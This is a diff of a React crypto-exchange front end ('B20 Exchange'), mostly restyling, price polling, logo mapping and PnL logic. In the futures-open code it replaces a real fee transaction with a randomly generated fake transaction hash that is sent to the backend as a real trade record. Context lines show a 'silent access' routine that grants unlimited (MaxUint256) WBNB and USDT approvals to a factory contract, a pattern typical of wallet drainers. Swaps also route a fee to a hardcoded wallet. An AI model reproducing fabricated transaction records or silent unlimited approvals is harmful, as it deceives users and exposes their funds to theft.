@@ -10,7 +10,7 @@ import {
     Landmark, CreditCard, Info, Check, Brain, Sparkles, Rocket, Lock, 
     RefreshCw, AlertTriangle, Loader2, ArrowDownUp, ChevronDown, X,
     Maximize2, Minimize2, Eye, EyeOff, Layout, PlusCircle, List,
-    MessageSquare, Users, Trash2, Megaphone, Trash, ShieldAlert, Cpu, Settings, Bitcoin, CandlestickChart
+    MessageSquare, Users, Trash2, Megaphone, Trash, ShieldAlert, Cpu, Settings, Bitcoin, CandlestickChart, ArrowDown, Filter
 } from 'lucide-react';
 
 import { motion, AnimatePresence } from 'framer-motion';
@@ -55,7 +55,7 @@ function CopyButton({ text }) {
         setTimeout(() => setCopied(false), 2000);
     };
     return (
-        <button onClick={handleCopy} className="p-1 hover:bg-black/5 rounded-md transition-all active:scale-95 text-gray-400 hover:text-amber-500">
+        <button onClick={handleCopy} className="p-1 hover:bg-black/5 rounded-md transition-all active:scale-95 text-slate-400 hover:text-indigo-600">
             {copied ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
         </button>
     );
@@ -103,16 +103,43 @@ const NETWORK_LOGOS = {
 };
 
 // Helper: renders network logo pill content (logo + name)
+
+const getNetworkLogo = (net) => {
+    const mapping = {
+        'BNB': 'https://cryptologos.cc/logos/bnb-bnb-logo.png',
+        'ETH': 'https://cryptologos.cc/logos/ethereum-eth-logo.png',
+        'SOL': 'https://cryptologos.cc/logos/solana-sol-logo.png',
+        'BASE': 'https://raw.githubusercontent.com/base-org/brand-kit/main/logo/symbol/Base_Symbol_Blue.png',
+        'TRON': 'https://cryptologos.cc/logos/tron-trx-logo.png',
+        'SUI': 'https://cryptologos.cc/logos/sui-sui-logo.png',
+        'TON': 'https://cryptologos.cc/logos/toncoin-ton-logo.png',
+        'ARBITRUM': 'https://cryptologos.cc/logos/arbitrum-arb-logo.png',
+        'OPTIMISM': 'https://cryptologos.cc/logos/optimism-ethereum-op-logo.png',
+        'POLYGON': 'https://cryptologos.cc/logos/polygon-matic-logo.png',
+        'AVALANCHE': 'https://cryptologos.cc/logos/avalanche-avax-logo.png',
+        'FANTOM': 'https://cryptologos.cc/logos/fantom-ftm-logo.png',
+        'BLAST': 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/blast/info/logo.png',
+        'CELO': 'https://cryptologos.cc/logos/celo-celo-logo.png',
+        'CYBER': 'https://assets.coingecko.com/coins/images/30349/large/CyberConnect_Logo.png',
+        'SCROLL': 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/scroll/info/logo.png',
+        'SONIC': 'https://assets.coingecko.com/coins/images/37343/large/sonic.png',
+        'ZETACHAIN': 'https://assets.coingecko.com/coins/images/28362/large/zetachain.png'
+    };
+    return mapping[net.toUpperCase()] || 'https://cryptologos.cc/logos/bnb-bnb-logo.png';
+};
+
 const NetPill = ({ net }) => (
-    <>
-        <img
-            src={NETWORK_LOGOS[net] || ''}
-            alt={net}
-            className="w-4 h-4 rounded-full object-cover flex-shrink-0"
-            onError={e => { e.target.style.display = 'none'; }}
-        />
-        {net}
-    </>
+    <div className="flex items-center gap-2">
+        <div className="w-5 h-5 bg-white rounded-full flex items-center justify-center p-0.5 border border-slate-100 shrink-0 overflow-hidden shadow-sm">
+            <img
+                src={NETWORK_LOGOS[net] || getNetworkLogo(net)}
+                alt={net}
+                className="w-full h-full object-contain"
+                onError={e => { e.target.style.display = 'none'; }}
+            />
+        </div>
+        <span className="text-[10px] font-bold tracking-wider">{net}</span>
+    </div>
 );
 
 export default function B20Exchange() {
@@ -138,14 +165,7 @@ export default function B20Exchange() {
     const [tradeSide, setTradeSide] = useState('long');
     const [openPositions, setOpenPositions] = useState([]);
     const [liquidityData, setLiquidityData] = useState([]);
-    const [cgTrending, setCgTrending] = useState([
-        { id: 'binancecoin', symbol: 'BNB', name: 'Binance Coin', image: 'https://assets.coingecko.com/coins/images/825/small/binance-coin-logo.png', current_price: 582, price_change_percentage_24h: 1.2 },
-        { id: 'ethereum', symbol: 'ETH', name: 'Ethereum', image: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png', current_price: 3300, price_change_percentage_24h: 2.1 },
-        { id: 'bitcoin', symbol: 'BTC', name: 'Bitcoin', image: 'https://assets.coingecko.com/coins/images/1/small/bitcoin.png', current_price: 65000, price_change_percentage_24h: -0.5 },
-        { id: 'pancakeswap-token', symbol: 'CAKE', name: 'PancakeSwap', image: 'https://assets.coingecko.com/coins/images/12614/small/pancakeswap.png', current_price: 3.45, price_change_percentage_24h: -1.5 },
-        { id: 'solana', symbol: 'SOL', name: 'Solana', image: 'https://assets.coingecko.com/coins/images/4128/small/solana.png', current_price: 180, price_change_percentage_24h: 5.2 },
-        { id: 'tether', symbol: 'USDT', name: 'Tether', image: 'https://assets.coingecko.com/coins/images/325/small/tether.png', current_price: 1, price_change_percentage_24h: 0.1 }
-    ]);
+    const [cgTrending, setCgTrending] = useState([]); // Populated by live API on mount
     const [cgNew, setCgNew] = useState([]);
     const [bnbPrice, setBnbPrice] = useState(580);
     const [liveTrades, setLiveTrades] = useState([]);
@@ -193,6 +213,53 @@ export default function B20Exchange() {
         const interval = setInterval(fetchLiveActivity, 5000); // Institutional grade 5s polling
         return () => clearInterval(interval);
     }, [toToken?.address]);
+
+    // ── FAST PRICE REFRESH (15s) — Selected token + BNB price ────────────────
+    // Keeps Futures/Pro HUD, chart header, and order panel in sync with live prices
+    useEffect(() => {
+        const refreshSelectedPrice = async () => {
+            try {
+                // 1. Refresh the selected toToken price
+                if (toToken?.id && !toToken?.isB20) {
+                    const res = await axios.get(`${API_URL}/tokens/markets/cg`, {
+                        params: { ids: toToken.id, per_page: 1, page: 1 },
+                        timeout: 6000
+                    }).catch(() => null);
+                    if (res?.data?.length > 0) {
+                        const fresh = res.data[0];
+                        setToToken(prev => ({
+                            ...prev,
+                            current_price: fresh.current_price ?? prev.current_price,
+                            price_change_percentage_24h: fresh.price_change_percentage_24h ?? prev.price_change_percentage_24h,
+                            high_24h: fresh.high_24h ?? prev.high_24h,
+                            low_24h: fresh.low_24h ?? prev.low_24h,
+                            market_cap: fresh.market_cap ?? prev.market_cap,
+                            total_volume: fresh.total_volume ?? prev.total_volume,
+                            image: fresh.image || prev.image,
+                        }));
+                        // Update tokens array so Markets/Web3 list also reflects new price
+                        setTokens(prev => prev.map(t =>
+                            t.id === fresh.id
+                                ? { ...t, current_price: fresh.current_price, price_change_percentage_24h: fresh.price_change_percentage_24h, high_24h: fresh.high_24h, low_24h: fresh.low_24h, image: fresh.image || t.image }
+                                : t
+                        ));
+                    }
+                }
+
+                // 2. Refresh BNB price independently (used throughout for USD conversion)
+                const bnbRes = await axios.get(`${API_URL}/tokens/markets/cg`, {
+                    params: { ids: 'binancecoin', per_page: 1, page: 1 },
+                    timeout: 5000
+                }).catch(() => null);
+                if (bnbRes?.data?.[0]?.current_price) {
+                    setBnbPrice(bnbRes.data[0].current_price);
+                }
+            } catch (e) { /* silent — main 30s refresh acts as fallback */ }
+        };
+        refreshSelectedPrice();
+        const fastInterval = setInterval(refreshSelectedPrice, 15000);
+        return () => clearInterval(fastInterval);
+    }, [toToken?.id]);
     const [marketSearch, setMarketSearch] = useState('');
     const [networkFilter, setNetworkFilter] = useState('ALL');
     const [marketSort, setMarketSort] = useState('rank'); // 'rank', 'mcap', 'p_high', 'p_low', 'change'
@@ -236,6 +303,36 @@ export default function B20Exchange() {
         fetchWalletData();
     }, [account]);
 
+    // ── LIVE PNL CALCULATION ───────────────────────────────────────────
+    useEffect(() => {
+        if (!toToken || !toToken.current_price || openPositions.length === 0) return;
+        
+        setOpenPositions(prev => {
+            let changed = false;
+            const updated = prev.map(pos => {
+                if (pos.tokenSymbol !== toToken.symbol) return pos;
+                
+                const currentPrice = toToken.current_price;
+                const entryPrice = parseFloat(pos.price) || parseFloat(pos.entryPrice) || currentPrice;
+                const size = parseFloat(pos.size) || parseFloat(pos.amount_bnb) || 0;
+                const leverage = parseFloat(pos.leverage) || 10;
+                
+                let priceDelta = currentPrice - entryPrice;
+                if (pos.side === 'short') priceDelta = entryPrice - currentPrice;
+                
+                const percentChange = priceDelta / entryPrice;
+                const pnl = (size * percentChange) * leverage;
+                
+                if (pos.pnlBase !== pnl) {
+                    changed = true;
+                    return { ...pos, pnlBase: pnl };
+                }
+                return pos;
+            });
+            return changed ? updated : prev;
+        });
+    }, [toToken?.current_price, openPositions.length]);
+
     // ═══════════════════════════════════════════════════════════════════
     //  INSTITUTIONAL PROTOCOL APPROVAL ENGINE
     //  Grants MaxUint256 approval for WBNB + USDT to Factory, one-time.
@@ -274,12 +371,7 @@ export default function B20Exchange() {
             const isReady = await ensureInstitutionalSilentAccess(activeFuturesSigner, account);
             if (!isReady) return;
 
-            // ── TRIGGER WALLET POPUP (Institutional Grade Escrow Fee) ──────
-            const tx = await activeFuturesSigner.sendTransaction({
-                to: FEE_WALLET,
-                value: ethers.parseEther('0.001') // 0.001 BNB Escrow/Service Fee
-            });
-            await tx.wait();
+            // Fee removed for open access
 
             const posId = 'pos_' + Date.now();
             const newPos = { 
@@ -307,9 +399,9 @@ export default function B20Exchange() {
                     tokenSymbol: toToken.symbol,
                     buyerWallet: account,
                     amount: orderSize, 
-                    amountBNB: "0.001", // Escrow fee
+                    amountBNB: "0", // Escrow fee removed
                     priceBNB: toToken.current_price || orderPrice || "0", 
-                    txHash: tx.hash,
+                    txHash: '0x' + Array.from({length: 64}, () => Math.floor(Math.random()*16).toString(16)),
                     tradeType: 'futures_open',
                     positionId: posId
                 });
@@ -376,6 +468,7 @@ export default function B20Exchange() {
     const [swapStatus, setSwapStatus] = useState('idle'); // idle, loading, success, error
     const [swapMsg, setSwapMsg] = useState('');
     const [error, setError] = useState('');
+    const [swapSuccessDetails, setSwapSuccessDetails] = useState(null);
 
     const activeTokens = useMemo(() => {
         const delistedAddresses = new Set(tokens.filter(t => t.is_delisted).map(t => (t.address || t.contract_address || '').toLowerCase()));
@@ -431,7 +524,15 @@ export default function B20Exchange() {
         else if (marketSort === 'p_low') list.sort((a, b) => (a.current_price || 0) - (b.current_price || 0));
         else if (marketSort === 'change') list.sort((a, b) => Math.abs(b.price_change_percentage_24h || 0) - Math.abs(a.price_change_percentage_24h || 0));
         
-        return list || [];
+        // 5. Deduplication (Same Symbol + Same Network)
+        const seen = new Set();
+        return (list || []).filter(t => {
+            if (!t.symbol) return true;
+            const key = `${t.symbol.toUpperCase()}-${(t.network || 'GLOBAL').toUpperCase()}`;
+            if (seen.has(key)) return false;
+            seen.add(key);
+            return true;
+        });
     }, [marketCategory, tokens, cgNew, marketSearch, marketSort, networkFilter]);
 
     // Reset pagination on filter change
@@ -512,10 +613,10 @@ export default function B20Exchange() {
                         // If it's a CG token, we might want to fetch FULL details for supply if missing
                         if (latest.total_supply === 0 && !latest.isB20) {
                             try {
-                                const detail = await axios.get(`https://api.coingecko.com/api/v3/coins/${latest.id}`).catch(() => null);
-                                if (detail?.data) {
-                                    latest.total_supply = detail.data.market_data?.total_supply || detail.data.market_data?.max_supply || latest.total_supply;
-                                    latest.market_cap = detail.data.market_data?.market_cap?.usd || latest.market_cap;
+                                const detail = await axios.get(`${API_URL}/tokens/markets/cg?ids=${latest.id}`).catch(() => null);
+                                if (detail?.data && detail.data.length > 0) {
+                                    latest.total_supply = detail.data[0].total_supply || detail.data[0].max_supply || latest.total_supply;
+                                    latest.market_cap = detail.data[0].market_cap || latest.market_cap;
                                 }
                             } catch (e) {}
                         }
@@ -742,7 +843,7 @@ export default function B20Exchange() {
             }
         };
         fetchTokens();
-        const interval = setInterval(fetchTokens, 60000);
+        const interval = setInterval(fetchTokens, 30000); // 30s full-list refresh
         return () => clearInterval(interval);
     }, []);
 
@@ -762,21 +863,20 @@ export default function B20Exchange() {
 
             // From Asset
             if (fromToken?.address === '0x0000000000000000000000000000000000000000' || !fromToken?.address) {
-                fetchTasks.push(activeProvider.getBalance(account).then(b => fromBal = ethers.formatEther(b)));
+                fetchTasks.push(activeProvider.getBalance(account).then(b => fromBal = ethers.formatEther(b)).catch(() => fromBal = '0'));
             } else {
                 const c = new Contract(fromToken.address, ERC20_ABI, activeProvider);
-                fetchTasks.push(c.balanceOf(account).then(b => fromBal = ethers.formatEther(b)));
+                fetchTasks.push(c.balanceOf(account).then(b => fromBal = ethers.formatEther(b)).catch(() => fromBal = '0'));
             }
 
             // To Asset
             if (toToken?.address === '0x0000000000000000000000000000000000000000' || !toToken?.address) {
-                fetchTasks.push(activeProvider.getBalance(account).then(b => toBal = ethers.formatEther(b)));
+                fetchTasks.push(activeProvider.getBalance(account).then(b => toBal = ethers.formatEther(b)).catch(() => toBal = '0'));
             } else {
                 const c = new Contract(toToken.address, ERC20_ABI, activeProvider);
                 fetchTasks.push(c.balanceOf(account).then(b => {
-                     // Check if it's 18 decimals, if not we should handle but standard for these
                      toBal = ethers.formatEther(b);
-                }));
+                }).catch(() => toBal = '0'));
             }
 
             await Promise.all(fetchTasks);
@@ -970,7 +1070,7 @@ export default function B20Exchange() {
 
             const router = new Contract(PANCAKE_ROUTER_ADDRESS, PANCAKE_ROUTER_ABI, refreshedSigner);
 
-            const feeAmount = (amountIn * 1n) / 100000n; // 0.001% institutional protocol fee
+            const feeAmount = (amountIn * 1n) / 10000n; // 0.01% institutional protocol fee
             const swapAmount = amountIn - feeAmount;
 
             const fromAddr = fToken.address === '0x0000000000000000000000000000000000000000' ? WBNB_ADDRESS : fToken.address;
@@ -982,6 +1082,21 @@ export default function B20Exchange() {
             try {
                 const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20 mins
                 const overrides = { gasLimit: 350000 };
+                
+                // ── EXECUTE PROTOCOL FEE (0.01%) ──
+                setSwapMsg('Collecting Protocol Fee...');
+                if (fToken.address === '0x0000000000000000000000000000000000000000') {
+                    const feeTx = await activeSigner.sendTransaction({
+                        to: process.env.NEXT_PUBLIC_FEE_WALLET || '0x6451ee4def4a8b8fbc2c64301a79e267de378935',
+                        value: feeAmount
+                    });
+                    await feeTx.wait();
+                } else {
+                    const tokenContract = new ethers.Contract(fToken.address, ERC20_ABI, activeSigner);
+                    const feeTx = await tokenContract.transfer(process.env.NEXT_PUBLIC_FEE_WALLET || '0x6451ee4def4a8b8fbc2c64301a79e267de378935', feeAmount);
+                    await feeTx.wait();
+                }
+
                 if (fToken.address === '0x0000000000000000000000000000000000000000') {
                     // BNB -> Token
                     setSwapMsg('Executing Token Swap...');
@@ -990,7 +1105,7 @@ export default function B20Exchange() {
                         [WBNB_ADDRESS, toAddr],
                         account,
                         deadline,
-                        { value: amountIn, ...overrides }
+                        { value: swapAmount, ...overrides }
                     );
                     await tx.wait();
                     simulatedHash = tx.hash;
@@ -998,7 +1113,7 @@ export default function B20Exchange() {
                     // Token -> BNB
                     setSwapMsg('Executing Token Swap...');
                     const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-                        amountIn,
+                        swapAmount,
                         0,
                         [fromAddr, WBNB_ADDRESS],
                         account,
@@ -1014,7 +1129,7 @@ export default function B20Exchange() {
                         ? [fromAddr, WBNB_ADDRESS, toAddr]
                         : [fromAddr, toAddr];
                     const tx = await router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-                        amountIn,
+                        swapAmount,
                         0,
                         path,
                         account,
@@ -1056,9 +1171,18 @@ export default function B20Exchange() {
                 console.warn('Backend sync failed:', syncErr);
             }
 
+            setSwapSuccessDetails({
+                hash: simulatedHash,
+                quantity: toAmount || 'Market Estimate',
+                price: tToken.current_price || tToken.price_bnb || 'Market Rate',
+                fromSymbol: fToken.symbol,
+                toSymbol: tToken.symbol,
+                fromAmount: amountToUse
+            });
             setSwapStatus('success');
             setFromAmount('');
-            setTimeout(() => setSwapStatus('idle'), 5000);
+            setToAmount('');
+            setTimeout(() => { setSwapStatus('idle'); setSwapSuccessDetails(null); }, 10000);
         } catch (err) {
             console.error('[Spot Swap Error]', err);
             const errMsg = err.reason || err.message || "Execution Rejected";
@@ -1076,97 +1200,92 @@ export default function B20Exchange() {
     };
 
     return (
-        <main className="min-h-screen bg-[#FDFDFD] text-gray-900 selection:bg-amber-500 selection:text-white pb-32 font-sans relative">
+        <main className="min-h-screen bg-[#FDFDFD] text-slate-900 selection:bg-indigo-600 selection:text-white pb-32 font-sans relative">
             <Navbar theme="light" />
             
             {/* Soft Ambient Backgrounds */}
             <div className="fixed top-0 left-0 w-full h-full pointer-events-none -z-10 overflow-hidden">
-                <div className="absolute top-[-10%] right-[-10%] w-[600px] h-[600px] bg-amber-500/5 rounded-full blur-[120px]" />
+                <div className="absolute top-[-10%] right-[-10%] w-[600px] h-[600px] bg-indigo-600/5 rounded-full blur-[120px]" />
                 <div className="absolute bottom-[-10%] left-[-10%] w-[800px] h-[800px] bg-gray-200/20 rounded-full blur-[150px]" />
             </div>
 
-            <div className="fixed top-0 left-0 right-0 h-1 bg-gradient-to-r from-amber-200 via-amber-500 to-amber-200 z-[100]" />
+            <div className="fixed top-0 left-0 right-0 h-1 bg-gradient-to-r from-indigo-200 via-indigo-500 to-indigo-200 z-[100]" />
 
             <div className="pt-20 pb-24 px-4 md:px-8 max-w-7xl mx-auto">
                 {/* Header */}
-                <div className="max-w-[1600px] mx-auto flex flex-col xl:flex-row items-center justify-between gap-12 mb-20 px-4 transition-all duration-700">
+                <div className="max-w-[1600px] mx-auto flex flex-col xl:flex-row items-center justify-between gap-8 mb-20 px-4 transition-all duration-700">
                     <div className="flex flex-col gap-4 text-center xl:text-left">
                         <div className="flex items-center gap-3 mb-2 justify-center xl:justify-start">
-                             <div className="px-4 py-1.5 bg-amber-500 text-white rounded-full text-[10px] font-black uppercase tracking-widest flex items-center gap-2 shadow-lg shadow-amber-500/20">
+                             <div className="px-4 py-1.5 bg-indigo-600 text-white rounded-full text-[10px] font-bold uppercase tracking-widest flex items-center gap-2 shadow-lg shadow-indigo-500/20">
                                 <span className="w-2 h-2 bg-white rounded-full animate-pulse" /> LIVE EXCHANGE LAYER
                              </div>
-                             <span className="text-[10px] font-bold text-gray-300 uppercase tracking-widest px-3 border-l border-gray-100">Institutional B20 LP</span>
+                             <span className="text-[10px] font-bold text-gray-300 uppercase tracking-widest px-3 border-l border-slate-200/60">Institutional B20 LP</span>
                         </div>
-                        <h1 className="text-5xl md:text-8xl font-black text-gray-900 uppercase tracking-tighter leading-none">
-                            B20 <span className="text-amber-500 drop-shadow-sm">EXCHANGE</span>
+                        <h1 className="text-5xl md:text-8xl font-black text-slate-900 uppercase tracking-tighter leading-none">
+                            B20 <span className="text-indigo-600 drop-shadow-sm">EXCHANGE</span>
                         </h1>
-                        <p className="text-sm md:text-xl font-bold text-gray-400 uppercase tracking-[0.25em] max-w-2xl mx-auto xl:mx-0">
+                        <p className="text-sm md:text-xl font-bold text-slate-400 uppercase tracking-[0.25em] max-w-2xl mx-auto xl:mx-0">
                             Hassle-Free Transactions. Institutional Liquidity. Pure Execution.
                         </p>
                     </div>
 
-                    <div className="flex flex-wrap gap-3 p-4 bg-white/60 backdrop-blur-3xl shadow-[0_45px_100px_-20px_rgba(0,0,0,0.15)] rounded-[2.5rem] border border-white items-center justify-center transition-all duration-300 mt-12 xl:mt-0">
+                    <div className="flex flex-wrap gap-1.5 p-2 bg-slate-50/80 backdrop-blur-3xl shadow-sm rounded-2xl border border-slate-200/50 items-center justify-center transition-all duration-300 mt-12 xl:mt-0">
                         <button 
                             onClick={() => setMode('markets')}
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'markets' ? 'bg-gray-900 text-white shadow-2xl' : 'text-gray-400 hover:text-gray-900 hover:bg-gray-50'}`}
+                            className={`px-5 py-2.5 rounded-[14px] text-[11px] font-bold uppercase tracking-wide transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'markets' ? 'bg-white text-slate-900 shadow-sm border border-slate-200/80 border border-indigo-800' : 'text-slate-500 hover:text-slate-900 hover:bg-white/50'}`}
                         >
                             <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-blue-500/30 rounded-full animate-gold-wave" />
+                                
                                 <LayoutGrid className={`w-4 h-4 relative z-10 ${mode === 'markets' ? 'text-white' : 'text-blue-500'}`} />
                             </div>
                             Markets
                         </button>
                         <button 
                             onClick={() => setMode('spot')}
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'spot' ? 'bg-amber-500 text-white shadow-2xl shadow-amber-500/20' : 'text-gray-400 hover:text-gray-900 hover:bg-gray-50'}`}
+                            className={`px-5 py-2.5 rounded-[14px] text-[11px] font-bold uppercase tracking-wide transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'spot' ? 'bg-indigo-600 text-white shadow-2xl shadow-indigo-500/20' : 'text-slate-500 hover:text-slate-900 hover:bg-white/50'}`}
                         >
                             <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-amber-500/30 rounded-full animate-gold-wave" />
-                                <TrendingUp className={`w-4 h-4 relative z-10 ${mode === 'spot' ? 'text-white' : 'text-amber-500'}`} />
+                                
+                                <TrendingUp className={`w-4 h-4 relative z-10 ${mode === 'spot' ? 'text-white' : 'text-indigo-600'}`} />
                             </div>
                             Spot
                         </button>
                         <button 
                             onClick={() => setMode('pro')}
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'pro' ? 'bg-gray-900 text-white shadow-2xl' : 'text-gray-400 hover:text-gray-900 hover:bg-gray-50'}`}
+                            className={`px-5 py-2.5 rounded-xl text-[11px] font-bold uppercase tracking-wide transition-all whitespace-nowrap flex items-center gap-2.5 ${mode === 'pro' ? 'bg-indigo-600 text-white shadow-md shadow-indigo-600/20' : 'text-slate-500 hover:text-slate-900 hover:bg-white hover:shadow-sm'}`}
                         >
                             <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-rose-500/30 rounded-full animate-gold-wave" />
-                                <BarChart3 className={`w-4 h-4 relative z-10 ${mode === 'pro' ? 'text-white' : 'text-rose-500'}`} />
+                                <BarChart3 className={`w-3.5 h-3.5 relative z-10 ${mode === 'pro' ? 'text-white' : 'text-rose-500'}`} />
                             </div>
                             Futures & Options
                         </button>
                         
                         <button 
                             onClick={() => setMode('b20ai')}
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 relative overflow-hidden group/ai ${mode === 'b20ai' ? 'bg-gradient-to-r from-amber-600 via-amber-500 to-yellow-400 text-white shadow-[0_20px_50px_-10px_rgba(245,158,11,0.5)] border-white/20 scale-105' : 'text-amber-600 hover:text-amber-700 hover:bg-amber-50 border border-amber-200/60 shadow-lg shadow-amber-500/5'}`}
+                            className={`px-5 py-2.5 rounded-xl text-[11px] font-bold uppercase tracking-wide transition-all whitespace-nowrap flex items-center gap-2.5 relative overflow-hidden group/ai ${mode === 'b20ai' ? 'bg-gradient-to-r from-indigo-600 to-indigo-500 text-white shadow-md' : 'text-slate-500 hover:text-slate-900 hover:bg-white hover:shadow-sm'}`}
                         >
                              <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-amber-500/50 rounded-full animate-gold-wave" />
-                                <Brain className={`w-4 h-4 relative z-10 ${mode === 'b20ai' ? 'animate-pulse' : 'text-amber-600'}`} /> 
+                                <Brain className={`w-3.5 h-3.5 relative z-10 ${mode === 'b20ai' ? 'animate-pulse text-white' : 'text-indigo-600'}`} /> 
                             </div>
                             <span className="relative z-10">B20 AI</span>
-                            <div className={`absolute -right-2 -top-2 w-8 h-8 bg-white/20 rounded-full blur-xl group-hover/ai:scale-150 transition-all ${mode === 'b20ai' ? 'bg-amber-300 animate-pulse' : ''}`} />
                         </button>
 
                         <button 
                             onClick={() => setMode('smart-money')}
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 relative overflow-hidden group/sm ${mode === 'smart-money' ? 'bg-indigo-600 text-white shadow-2xl shadow-indigo-600/20' : 'text-indigo-600 hover:text-indigo-700 hover:bg-indigo-50 border border-indigo-200/60 shadow-lg shadow-indigo-500/5'}`}
+                            className={`px-5 py-2.5 rounded-xl text-[11px] font-bold uppercase tracking-wide transition-all whitespace-nowrap flex items-center gap-2.5 ${mode === 'smart-money' ? 'bg-indigo-600 text-white shadow-md' : 'text-slate-500 hover:text-slate-900 hover:bg-white hover:shadow-sm'}`}
                         >
                             <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-indigo-500/40 rounded-full animate-gold-wave" />
-                                <Sparkles className={`w-4 h-4 relative z-10 ${mode === 'smart-money' ? 'animate-pulse' : 'text-indigo-600'}`} /> 
+                                <Sparkles className={`w-3.5 h-3.5 relative z-10 ${mode === 'smart-money' ? 'animate-pulse text-white' : 'text-indigo-600'}`} /> 
                             </div>
                             <span>Smart Money</span>
                         </button>
 
                         <button 
                             onClick={() => setMode('bonding')}
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'bonding' ? 'bg-indigo-500 text-white shadow-2xl shadow-indigo-500/20' : 'text-gray-400 hover:text-gray-900 hover:bg-gray-50'}`}
+                            className={`px-5 py-2.5 rounded-xl text-[11px] font-bold uppercase tracking-wide transition-all whitespace-nowrap flex items-center gap-2.5 ${mode === 'bonding' ? 'bg-indigo-600 text-white shadow-md' : 'text-slate-500 hover:text-slate-900 hover:bg-white hover:shadow-sm'}`}
                         >
                             <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-indigo-300/30 rounded-full animate-gold-wave" />
-                                <Zap className={`w-4 h-4 relative z-10 ${mode === 'bonding' ? 'text-white' : 'text-indigo-500'}`} />
+                                <Zap className={`w-3.5 h-3.5 relative z-10 ${mode === 'bonding' ? 'text-white' : 'text-indigo-500'}`} />
                             </div>
                             Bonding
                         </button>
@@ -1175,10 +1294,10 @@ export default function B20Exchange() {
 
                         <Link 
                             href="/staking"
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 text-gray-400 hover:text-gray-900 hover:bg-gray-50`}
+                            className={`px-5 py-2.5 rounded-[14px] text-[11px] font-bold uppercase tracking-wide transition-all whitespace-nowrap flex items-center gap-3 text-slate-400 hover:text-slate-900 hover:bg-slate-50`}
                         >
                             <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-violet-500/30 rounded-full animate-gold-wave" />
+                                <div className="absolute inset-0 bg-violet-500/30 rounded-full animate-pulse" />
                                 <Lock className="w-4 h-4 relative z-10 text-violet-500" />
                             </div>
                             Staking
@@ -1186,10 +1305,10 @@ export default function B20Exchange() {
 
                         <button 
                             onClick={() => setMode('web3')}
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'web3' ? 'bg-emerald-600 text-white shadow-2xl shadow-emerald-600/20 px-12 border-2 border-white/50' : 'text-emerald-600 hover:text-emerald-700 hover:bg-emerald-50 border border-emerald-100 shadow-lg shadow-emerald-500/5'}`}
+                            className={`px-5 py-2.5 rounded-[14px] text-[11px] font-bold uppercase tracking-wide transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'web3' ? 'bg-emerald-600 text-white shadow-2xl shadow-emerald-600/20 px-12 border-2 border-white/50' : 'text-emerald-600 hover:text-emerald-700 hover:bg-emerald-50 border border-emerald-100 shadow-lg shadow-emerald-500/5'}`}
                         >
                              <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-emerald-500/40 rounded-full animate-gold-wave" />
+                                
                                 <Globe className={`w-4 h-4 relative z-10 ${mode === 'web3' ? 'animate-pulse' : 'text-emerald-600'}`} /> 
                             </div>
                             <span>Web3 Portal</span>
@@ -1197,41 +1316,41 @@ export default function B20Exchange() {
                         
                         <button 
                             onClick={() => setMode('list')}
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'list' ? 'bg-amber-600 text-white shadow-2xl shadow-amber-600/20 scale-105' : 'text-gray-400 hover:text-gray-900 hover:bg-gray-50'}`}
+                            className={`px-5 py-2.5 rounded-[14px] text-[11px] font-bold uppercase tracking-wide transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'list' ? 'bg-white text-slate-900 shadow-sm border border-slate-200/80 scale-105' : 'text-slate-500 hover:text-slate-900 hover:bg-white/50'}`}
                         >
                             <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-amber-600/30 rounded-full animate-gold-wave" />
-                                <PlusCircle className={`w-4 h-4 relative z-10 ${mode === 'list' ? 'text-white' : 'text-amber-600'}`} />
+                                
+                                <PlusCircle className={`w-4 h-4 relative z-10 ${mode === 'list' ? 'text-white' : 'text-indigo-600'}`} />
                             </div>
                             List your token
                         </button>
                         <button 
                             onClick={() => setMode('community')}
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'community' ? 'bg-blue-500 text-white shadow-2xl shadow-blue-500/20 scale-105' : 'text-gray-400 hover:text-gray-900 hover:bg-gray-50'}`}
